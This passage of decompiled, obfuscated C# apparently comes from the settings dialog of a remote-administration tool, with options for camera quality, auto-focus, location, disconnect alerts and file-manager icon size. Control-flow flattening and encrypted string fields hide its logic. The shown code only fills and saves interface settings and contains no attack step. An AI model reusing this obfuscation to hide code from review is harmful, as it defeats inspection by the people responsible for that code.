            index = this.DGV7.Rows.Add((object) EXGuarder.\u00332693539, null);
            num1 = (int) num2 * -2073703287 ^ 854357946;
            continue;
          case 21:
            stringList.Add(EXGuarder.\u00378365033);
            stringList.Add(EXGuarder.\u003456C4E60);
            cell13.DataSource = (object) stringList;
            num1 = (int) num2 * -1152155307 ^ 1282311388;
            continue;
          case 22:
            cell5 = (DataGridViewComboBoxCell) this.DGV6.Rows[index].Cells[1];
            num1 = (int) num2 * -1992226281 ^ -742674911;
            continue;
          case 23:
            this.DGV7.ClearSelection();
            this.DGV8.ClearSelection();
            this.DGV9.ClearSelection();
            num1 = (int) num2 * -1643133052 ^ 1839054992;
            continue;
          case 24:
            stringList.Add(EXGuarder.\u00342654304);
            stringList.Add(EXGuarder.\u0030C143563);
            num1 = (int) num2 * -2034260233 ^ -1624826524;
            continue;
          case 25:
            // ISSUE: reference to a compiler-generated method
            pen = new Pen(ControlPaint.Light(MySettings.get_Settings().DefaultColorBackground), 1f);
            num1 = (int) num2 * 1737379775 ^ 119617654;
            continue;
          case 26:
            this.DGV5.Rows[index].Tag = (object) color;
            num1 = (int) num2 * 1302326103 ^ 853233291;
            continue;
          case 27:
            stringList.Add(EXGuarder.\u00342654304);
            stringList.Add(EXGuarder.\u0030C143563);
            num1 = (int) num2 * -232360791 ^ -1621463426;
            continue;
          case 28:
            cell12.DataSource = (object) stringList;
            num1 = (int) num2 * 944764034 ^ 1056211400;
            continue;
          case 29:
            index = this.DGV2.Rows.Add((object) EXGuarder.\u00317280555, null);
            num1 = (int) num2 * 26727261 ^ -1655037084;
            continue;
          case 30:
            // ISSUE: reference to a compiler-generated method
            cell9.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().CAMQuality)];
            num1 = (int) num2 * 2032567246 ^ -349054948;
            continue;
          case 31:
            cell11 = (DataGridViewComboBoxCell) this.DGV0.Rows[index].Cells[1];
            num1 = (int) num2 * 1016434667 ^ -1226544305;
            continue;
          case 32:
            graphics.DrawRectangle(pen, 0, 0, checked (bitmap.Width - 1), checked (bitmap.Height - 1));
            index = this.DGV5.Rows.Add((object) EXGuarder.\u0036C305251, (object) bitmap);
            num1 = (int) num2 * -1482705180 ^ 840400641;
            continue;
          case 33:
            this.DGV5.Rows[index].Tag = (object) color;
            num1 = (int) num2 * 1543869555 ^ 531575400;
            continue;
          case 34:
            // ISSUE: reference to a compiler-generated method
            pen = new Pen(ControlPaint.Light(MySettings.get_Settings().DefaultColor_NewColorFiles), 1f);
            graphics.DrawRectangle(pen, 0, 0, checked (bitmap.Width - 1), checked (bitmap.Height - 1));
            index = this.DGV5.Rows.Add((object) EXGuarder.\u00365764875, (object) bitmap);
            num1 = (int) num2 * -122311859 ^ 151179822;
            continue;
          case 35:
            // ISSUE: reference to a compiler-generated method
            cell16.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().performance)];
            stringList = new List<string>();
            num1 = (int) num2 * -230219274 ^ -2011109995;
            continue;
          case 36:
            cell2.DataSource = (object) stringList;
            num1 = (int) num2 * 1974101251 ^ 346893330;
            continue;
          case 37:
            stringList.Add(EXGuarder.\u0036844600F);
            num1 = (int) num2 * 1319584142 ^ -1853542434;
            continue;
          case 38:
            cell16 = (DataGridViewComboBoxCell) this.DGV0.Rows[index].Cells[1];
            num1 = (int) num2 * -1109511263 ^ -1384368037;
            continue;
          case 39:
            index = this.DGV6.Rows.Add((object) EXGuarder.\u00342062E5E, null);
            num1 = (int) num2 * -450023043 ^ 258242684;
            continue;
          case 40:
            stringList.Add(EXGuarder.\u00342654304);
            num1 = (int) num2 * 79574958 ^ -1545978260;
            continue;
          case 41:
            cell14.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell14.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings()._multi_sounds)];
            num1 = (int) num2 * -221311784 ^ -1260128412;
            continue;
          case 42:
            stringList = new List<string>();
            num1 = (int) num2 * -994797850 ^ -127885118;
            continue;
          case 43:
            // ISSUE: reference to a compiler-generated method
            cell1.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().SStatus_Visible)];
            stringList = new List<string>();
            num1 = (int) num2 * -240768323 ^ 1465354895;
            continue;
          case 44:
            // ISSUE: reference to a compiler-generated method
            cell2.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().location)];
            num1 = (int) num2 * -1439306052 ^ -2076070216;
            continue;
          case 45:
            index = this.DGV9.Rows.Add((object) EXGuarder.\u0034D716A4C, null);
            cell7 = (DataGridViewComboBoxCell) this.DGV9.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u00342285620);
            stringList.Add(EXGuarder.\u0036C022E75);
            num1 = (int) num2 * 88005593 ^ -1761275322;
            continue;
          case 46:
            stringList = new List<string>();
            index = this.DGV4.Rows.Add((object) EXGuarder.\u0031D782B49, null);
            cell4 = (DataGridViewComboBoxCell) this.DGV4.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u00342654304);
            num1 = (int) num2 * -1638552411 ^ -1202426418;
            continue;
          case 47:
            index = this.DGV2.Rows.Add((object) EXGuarder.\u003554C045B, null);
            cell9 = (DataGridViewComboBoxCell) this.DGV2.Rows[index].Cells[1];
            num1 = (int) num2 * -1226720981 ^ 1635387164;
            continue;
          case 48:
            stringList = new List<string>();
            num1 = (int) num2 * 2044643732 ^ 1781460795;
            continue;
          case 49:
            stringList.Add(EXGuarder.\u0031F60575E);
            num1 = (int) num2 * 1200597149 ^ -2015093346;
            continue;
          case 50:
            cell1.DataSource = (object) stringList;
            num1 = (int) num2 * -1354952713 ^ 815990919;
            continue;
          case 51:
            this.DGV4.ClearSelection();
            this.DGV5.ClearSelection();
            num1 = (int) num2 * 1183848465 ^ -193810410;
            continue;
          case 52:
            index = this.DGV3.Rows.Add((object) EXGuarder.\u00342062E5E, null);
            cell20 = (DataGridViewComboBoxCell) this.DGV3.Rows[index].Cells[1];
            num1 = (int) num2 * -756460362 ^ 595562383;
            continue;
          case 53:
            graphics.Dispose();
            num1 = (int) num2 * 310728596 ^ 1350440282;
            continue;
          case 54:
            // ISSUE: reference to a compiler-generated method
            cell13.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().encoding8)];
            num1 = (int) num2 * -75613052 ^ -489325859;
            continue;
          case 55:
            goto label_1;
          case 56:
            // ISSUE: reference to a compiler-generated method
            cell8.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().show_alert)];
            num1 = (int) num2 * -1501354109 ^ 168204977;
            continue;
          case 57:
            stringList.Add(EXGuarder.\u0030C143563);
            num1 = (int) num2 * 2036302913 ^ 1865524526;
            continue;
          case 58:
            stringList.Add(EXGuarder.\u0032E584B25);
            num1 = (int) num2 * 1260962306 ^ -1230783872;
            continue;
          case 59:
            stringList.Add(EXGuarder.\u0030C143563);
            num1 = (int) num2 * -219130028 ^ 2126787584;
            continue;
          case 60:
            stringList.Add(EXGuarder.\u00342654304);
            num1 = (int) num2 * 2102594160 ^ -755928164;
            continue;
          case 61:
            graphics.Dispose();
            num1 = (int) num2 * -1595096936 ^ -1342293624;
            continue;
          case 62:
            stringList.Add(EXGuarder.\u0030C143563);
            cell19.DataSource = (object) stringList;
            num1 = (int) num2 * -731563164 ^ -1865422788;
            continue;
          case 63:
            cell18.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell18.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().NOTI_SOUND ? EXGuarder.\u00342654304 : EXGuarder.\u0030C143563)];
            num1 = -1182571095;
            continue;
          case 64:
            stringList.Add(EXGuarder.\u0034F3D6624);
            stringList.Add(EXGuarder.\u0032223753B);
            cell16.DataSource = (object) stringList;
            num1 = (int) num2 * 304538345 ^ -1764923751;
            continue;
          case 65:
            cell19 = (DataGridViewComboBoxCell) this.DGV1.Rows[index].Cells[1];
            num1 = (int) num2 * 120683600 ^ 2019269762;
            continue;
          case 66:
            cell1 = (DataGridViewComboBoxCell) this.DGV8.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u00342654304);
            num1 = (int) num2 * -1798039293 ^ -2017313661;
            continue;
          case 67:
            cell3 = (DataGridViewComboBoxCell) this.DGV2.Rows[index].Cells[1];
            num1 = (int) num2 * -1085247641 ^ 1709369961;
            continue;
          case 68:
            stringList = new List<string>();
            index = this.DGV6.Rows.Add((object) EXGuarder.\u00332693539, null);
            cell10 = (DataGridViewComboBoxCell) this.DGV6.Rows[index].Cells[1];
            num1 = (int) num2 * -287189017 ^ 1542917640;
            continue;
          case 69:
            stringList.Add(EXGuarder.\u0030C143563);
            cell4.DataSource = (object) stringList;
            num1 = (int) num2 * -1328549735 ^ 2016491035;
            continue;
          case 70:
            index = this.DGV1.Rows.Add((object) EXGuarder.\u0034F146369, null);
            cell14 = (DataGridViewComboBoxCell) this.DGV1.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u00342654304);
            num1 = (int) num2 * -363034834 ^ -658893626;
            continue;
          case 71:
            stringList.Add(EXGuarder.\u00348203D76);
            stringList.Add(EXGuarder.\u003410D0774);
            cell11.DataSource = (object) stringList;
            num1 = (int) num2 * -1775083811 ^ -375651565;
            continue;
          case 72:
            index = this.DGV0.Rows.Add((object) EXGuarder.\u00348676974, null);
            cell12 = (DataGridViewComboBoxCell) this.DGV0.Rows[index].Cells[1];
            num1 = (int) num2 * 2124394530 ^ 348819691;
            continue;
          case 73:
            index = this.DGV5.Rows.Add((object) EXGuarder.\u0036F166C55, (object) bitmap);
            num1 = (int) num2 * -1194949845 ^ 1660694200;
            continue;
          case 74:
            stringList.Add(EXGuarder.\u0030E4E081D);
            stringList.Add(EXGuarder.\u00313781D01);
            stringList.Add(EXGuarder.\u0034241712D);
            num1 = (int) num2 * 721933161 ^ -15098514;
            continue;
          case 75:
            cell10.DataSource = (object) stringList;
            num1 = (int) num2 * -791934534 ^ -606211596;
            continue;
          case 76:
            index = this.DGV2.Rows.Add((object) EXGuarder.\u00333270D3E, null);
            num1 = (int) num2 * 660404995 ^ -639100724;
            continue;
          case 77:
            stringList.Add(EXGuarder.\u00342654304);
            num1 = (int) num2 * 1906824691 ^ 412113333;
            continue;
          case 78:
            stringList = new List<string>();
            index = this.DGV1.Rows.Add((object) EXGuarder.\u0033A4A3E62, null);
            cell2 = (DataGridViewComboBoxCell) this.DGV1.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u0036A005D34);
            stringList.Add(EXGuarder.\u0036A547945);
            num1 = (int) num2 * 744466579 ^ 566800160;
            continue;
          case 79:
            cell6 = (DataGridViewComboBoxCell) this.DGV2.Rows[index].Cells[1];
            num1 = (int) num2 * -723020077 ^ -1979575236;
            continue;
          case 80:
            index = this.DGV0.Rows.Add((object) EXGuarder.\u0034233666C, null);
            num1 = (int) num2 * -522565766 ^ -2021860542;
            continue;
          case 81:
            this.DGV3.ClearSelection();
            num1 = (int) num2 * 670790150 ^ 2124737056;
            continue;
          case 82:
            cell17 = (DataGridViewComboBoxCell) this.DGV7.Rows[index].Cells[1];
            stringList.Add(EXGuarder.\u00334070F5A);
            num1 = (int) num2 * 379864490 ^ 1872865839;
            continue;
          case 83:
            stringList.Add(EXGuarder.\u0034F3D6624);
            num1 = (int) num2 * -2012027931 ^ -1822962759;
            continue;
          case 84:
            index = this.DGV0.Rows.Add((object) EXGuarder.\u003184D4516, null);
            num1 = (int) num2 * 1754501391 ^ 396146558;
            continue;
          case 85:
            stringList.Add(EXGuarder.\u0035B6C694C);
            num1 = (int) num2 * -2044315324 ^ -2051209045;
            continue;
          case 86:
            cell15 = (DataGridViewComboBoxCell) this.DGV7.Rows[index].Cells[1];
            num1 = (int) num2 * -404097412 ^ -334334928;
            continue;
          case 87:
            this.DGV5.Rows[index].Tag = (object) color;
            num1 = (int) num2 * -170715806 ^ -1188098345;
            continue;
          case 88:
            stringList.Add(EXGuarder.\u003754F5F57);
            stringList.Add(EXGuarder.\u003674A3718);
            num1 = (int) num2 * 1669512425 ^ -1113211400;
            continue;
          case 89:
            stringList.Add(EXGuarder.\u003792B2E2B);
            num1 = (int) num2 * 1878512966 ^ -2099172826;
            continue;
          case 90:
            // ISSUE: reference to a compiler-generated method
            cell12.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Removing_Duplicates)];
            stringList = new List<string>();
            num1 = (int) num2 * -208826117 ^ 102839166;
            continue;
          case 91:
            // ISSUE: reference to a compiler-generated method
            pen = new Pen(ControlPaint.Light(MySettings.get_Settings().DefaultColor_ColorTitles), 1f);
            num1 = (int) num2 * -514328621 ^ 877600800;
            continue;
          case 92:
            this.DGV6.ClearSelection();
            num1 = (int) num2 * -1750056351 ^ 2078072401;
            continue;
          case 93:
            this.DGV5.Rows[index].Tag = (object) color;
            graphics.Dispose();
            bitmap = new Bitmap(21, 17);
            num1 = (int) num2 * -1277862655 ^ 1050767589;
            continue;
          case 94:
            cell6.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell6.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Effects_CAM)];
            num1 = (int) num2 * -186185371 ^ -485835241;
            continue;
          case 95:
            stringList.Add(EXGuarder.\u0030C143563);
            num1 = (int) num2 * -1154645811 ^ -334920997;
            continue;
          case 96:
            // ISSUE: reference to a compiler-generated method
            cell19.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Round)];
            num1 = (int) num2 * 930272244 ^ 1900775560;
            continue;
          case 97:
            stringList = new List<string>();
            num1 = (int) num2 * 2134612767 ^ -540345757;
            continue;
          case 98:
            stringList = new List<string>();
            num1 = (int) num2 * -436607671 ^ -537769229;
            continue;
          case 99:
            cell9.DataSource = (object) stringList;
            num1 = (int) num2 * 1086846894 ^ 689530928;
            continue;
          case 100:
            stringList = new List<string>();
            num1 = (int) num2 * 2082492070 ^ 1625098911;
            continue;
          case 101:
            // ISSUE: reference to a compiler-generated method
            cell5.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().FontStyle)];
            stringList = new List<string>();
            index = this.DGV7.Rows.Add((object) EXGuarder.\u00301632305, null);
            num1 = (int) num2 * -659673799 ^ 165394337;
            continue;
          case 102:
            cell7.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell7.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().FM_IC_Size)];
            this.DGV0.ClearSelection();
            num1 = (int) num2 * -385557819 ^ 182025938;
            continue;
          case 103:
            stringList = new List<string>();
            num1 = (int) num2 * -1419220244 ^ 1930986803;
            continue;
          case 104:
            stringList.Add(EXGuarder.\u00302714312);
            num1 = (int) num2 * -1179345048 ^ -199792088;
            continue;
          case 105:
            this.DGV1.ClearSelection();
            num1 = (int) num2 * -1118929748 ^ 1132477211;
            continue;
          case 106:
            // ISSUE: reference to a compiler-generated method
            cell10.Value = (object) stringList[stringList.IndexOf(Conversions.ToString(MySettings.get_Settings().FontSize))];
            num1 = (int) num2 * -583204110 ^ -902978365;
            continue;
          case 107:
            stringList.Add(EXGuarder.\u0030C143563);
            num1 = (int) num2 * 637393603 ^ -1560263962;
            continue;
          case 108:
            // ISSUE: reference to a compiler-generated method
            pen = new Pen(ControlPaint.Light(MySettings.get_Settings().DefaultColorForeground), 1f);
            graphics.DrawRectangle(pen, 0, 0, checked (bitmap.Width - 1), checked (bitmap.Height - 1));
            num1 = (int) num2 * -678764930 ^ -1090135779;
            continue;
          case 109:
            graphics.Clear(color);
            num1 = (int) num2 * 1528376479 ^ -2297374;
            continue;
          case 110:
            stringList.Add(EXGuarder.\u003374D1B28);
            num1 = (int) num2 * -1397551356 ^ -1839945834;
            continue;
          case 111:
            stringList = new List<string>();
            num1 = (int) num2 * 1258531726 ^ -1854018554;
            continue;
          case 112:
            graphics.Clear(color);
            num1 = (int) num2 * -1556837266 ^ 1534644744;
            continue;
          case 113:
            // ISSUE: reference to a compiler-generated method
            cell11.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().disconnected)];
            stringList = new List<string>();
            num1 = (int) num2 * -449365411 ^ -40719137;
            continue;
          case 114:
            index = this.DGV5.Rows.Add((object) EXGuarder.\u003293F0F6E, (object) bitmap);
            num1 = (int) num2 * 1165616659 ^ 636218967;
            continue;
          case 115:
            stringList.Add(EXGuarder.\u003021E4577);
            stringList.Add(EXGuarder.\u0030E200D64);
            stringList.Add(EXGuarder.\u00327206A13);
            stringList.Add(EXGuarder.\u0033F03541E);
            num1 = (int) num2 * -710821988 ^ -672885939;
            continue;
          case 116:
            cell5.DataSource = (object) stringList;
            num1 = (int) num2 * 1881830507 ^ -2022525513;
            continue;
          case 117:
            // ISSUE: reference to a compiler-generated method
            color = MySettings.get_Settings().DefaultColorForeground;
            num1 = (int) num2 * 1253290783 ^ -1413220436;
            continue;
          case 118:
            stringList = new List<string>();
            index = this.DGV1.Rows.Add((object) EXGuarder.\u00342170815, null);
            num1 = (int) num2 * 1397429287 ^ 1232257590;
            continue;
          case 119:
            stringList.Add(EXGuarder.\u0030E715276);
            stringList.Add(EXGuarder.\u0031A08483F);
            cell17.DataSource = (object) stringList;
            // ISSUE: reference to a compiler-generated method
            cell17.Value = (object) stringList[stringList.IndexOf(MySettings.get_Settings().Flags_Size)];
            num1 = (int) num2 * -571655838 ^ 689823064;
            continue;
          case 120:
            stringList.Add(EXGuarder.\u00321606729);
            num1 = (int) num2 * 115346805 ^ -1569213673;
            continue;
          case 121:
            this.DGV2.ClearSelection();
            num1 = (int) num2 * 864791500 ^ 945850374;
            continue;
          case 122:
            bitmap = new Bitmap(21, 17);
            graphics = Graphics.FromImage((Image) bitmap);
            // ISSUE: reference to a compiler-generated method
            color = MySettings.get_Settings().DefaultColor_NewColorFiles;
            graphics.Clear(color);
            num1 = (int) num2 * 70480967 ^ -787210865;
            continue;
          case 123:
            index = this.DGV1.Rows.Add((object) EXGuarder.\u0031C2A4406, null);
            cell8 = (DataGridViewComboBoxCell) this.DGV1.Rows[index].Cells[1];
            num1 = (int) num2 * 1710888668 ^ -581765560;
            continue;
          case 124:
            stringList = new List<string>();
            num1 = (int) num2 * 1803247610 ^ 925595151;
            continue;
          default:
            goto label_127;
        }
      }
label_3:
      return;
label_127:;
    }

    private void SV_Click(object sender, EventArgs e)
    {
      int num1 = 0;
      IEnumerator enumerator1;
      try
      {
        enumerator1 = ((IEnumerable) this.DGV0.Rows).GetEnumerator();
label_10:
        int num2 = enumerator1.MoveNext() ? -1477461375 : (num2 = -1578650714);
        while (true)
        {
          int num3 = num2;
          uint num4;
          object objectValue;
          switch ((num4 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num3 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 13U)
          {
            case 0:
              num2 = -1477461375;
              continue;
            case 1:
              checked { ++num1; }
              num2 = 1852121297;
              continue;
            case 2:
label_11:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Removing_Duplicates = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num2 = -1652932450;
              continue;
            case 3:
label_7:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().encoding8 = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num2 = 1144026716;
              continue;
            case 4:
              goto label_10;
            case 5:
              switch (num1)
              {
                case 0:
                  goto label_8;
                case 1:
                  goto label_7;
                case 2:
                  goto label_15;
                case 3:
                  goto label_11;
                default:
                  num2 = (int) num4 * -127490693 ^ -742876461;
                  continue;
              }
            case 6:
              num2 = (int) num4 * 336161274 ^ -1888373688;
              continue;
            case 7:
label_8:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().performance = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num2 = -1652932450;
              continue;
            case 8:
              num2 = (int) num4 * -738421251 ^ -442287705;
              continue;
            case 10:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator1.Current);
              num2 = -1725550482;
              continue;
            case 11:
label_15:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().disconnected = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num2 = -1280463889;
              continue;
            case 12:
              num2 = (int) num4 * -2130613726 ^ 1381642070;
              continue;
            default:
              goto label_21;
          }
        }
      }
      finally
      {
        if (enumerator1 is IDisposable)
        {
label_17:
          int num5 = -1199736032;
          while (true)
          {
            int num6 = num5;
            uint num7;
            switch ((num7 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num6 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 0:
                goto label_17;
              case 1:
                (enumerator1 as IDisposable).Dispose();
                num5 = (int) num7 * 386534220 ^ -570498016;
                continue;
              default:
                goto label_20;
            }
          }
        }
label_20:;
      }
label_21:
      int num8 = 0;
      IEnumerator enumerator2;
      try
      {
        enumerator2 = ((IEnumerable) this.DGV1.Rows).GetEnumerator();
label_23:
        int num9 = 18238671;
        while (true)
        {
          int num10 = num9;
          uint num11;
          object objectValue;
          switch ((num11 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num10 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 16U)
          {
            case 0:
              goto label_23;
            case 2:
label_37:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().NOTI_SOUND = (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) EXGuarder.\u003501B4148, false) ? 1 : 0) != 0;
              num9 = -488889735;
              continue;
            case 3:
label_29:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Round = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num9 = 944265198;
              continue;
            case 4:
label_30:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings()._multi_sounds = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num9 = -1908501612;
              continue;
            case 5:
              num9 = (int) num11 * -646506964 ^ 99755250;
              continue;
            case 6:
              checked { ++num8; }
              num9 = 1920745157;
              continue;
            case 7:
label_35:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().show_alert = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num9 = -657641258;
              continue;
            case 8:
              num9 = (int) num11 * -1202508592 ^ 1607311726;
              continue;
            case 9:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator2.Current);
              switch (num8)
              {
                case 0:
                  goto label_35;
                case 1:
                  goto label_38;
                case 2:
                  goto label_37;
                case 3:
                  goto label_30;
                case 4:
                  goto label_29;
                default:
                  num9 = 167616576;
                  continue;
              }
            case 10:
label_38:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().location = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num9 = -1602845801;
              continue;
            case 11:
              int num12;
              num9 = num12 = enumerator2.MoveNext() ? 1059816411 : (num12 = 1282208131);
              continue;
            case 12:
              num9 = (int) num11 * 1649574418 ^ -1306146666;
              continue;
            case 13:
              num9 = (int) num11 * 1200755902 ^ -912904349;
              continue;
            case 14:
              num9 = (int) num11 * 1292720145 ^ -1346649664;
              continue;
            case 15:
              num9 = (int) num11 * 1618394676 ^ 1349209058;
              continue;
            default:
              goto label_45;
          }
        }
      }
      finally
      {
        if (enumerator2 is IDisposable)
        {
label_41:
          int num13 = -593092821;
          while (true)
          {
            int num14 = num13;
            uint num15;
            switch ((num15 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num14 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 1:
                (enumerator2 as IDisposable).Dispose();
                num13 = (int) num15 * -518167396 ^ 1087014670;
                continue;
              case 2:
                goto label_41;
              default:
                goto label_44;
            }
          }
        }
label_44:;
      }
label_45:
      int num16 = 0;
      IEnumerator enumerator3;
      try
      {
        enumerator3 = ((IEnumerable) this.DGV2.Rows).GetEnumerator();
label_47:
        int num17 = 19702596;
        while (true)
        {
          int num18 = num17;
          uint num19;
          object objectValue;
          switch ((num19 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num18 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 13U)
          {
            case 0:
              num17 = (int) num19 * -359470429 ^ -282100265;
              continue;
            case 1:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator3.Current);
              num17 = 644536484;
              continue;
            case 2:
              checked { ++num16; }
              num17 = 269539359;
              continue;
            case 3:
              num17 = (int) num19 * 2103702954 ^ 98669701;
              continue;
            case 4:
              int num20;
              num17 = num20 = enumerator3.MoveNext() ? -1134988182 : (num20 = 32851533);
              continue;
            case 6:
label_49:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().CAMQuality = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num17 = -1590033473;
              continue;
            case 7:
              num17 = (int) num19 * 243055802 ^ -1239573619;
              continue;
            case 8:
              goto label_47;
            case 9:
              switch (num16)
              {
                case 0:
                  goto label_56;
                case 1:
                  goto label_52;
                case 2:
                  goto label_49;
                default:
                  num17 = (int) num19 * 935476610 ^ -1376066057;
                  continue;
              }
            case 10:
label_56:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Auto_focus = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num17 = -1277033013;
              continue;
            case 11:
              num17 = (int) num19 * -1974325940 ^ 1640180751;
              continue;
            case 12:
label_52:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Effects_CAM = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num17 = 1535349392;
              continue;
            default:
              goto label_66;
          }
        }
      }
      finally
      {
        if (enumerator3 is IDisposable)
        {
label_62:
          int num21 = 472077320;
          while (true)
          {
            int num22 = num21;
            uint num23;
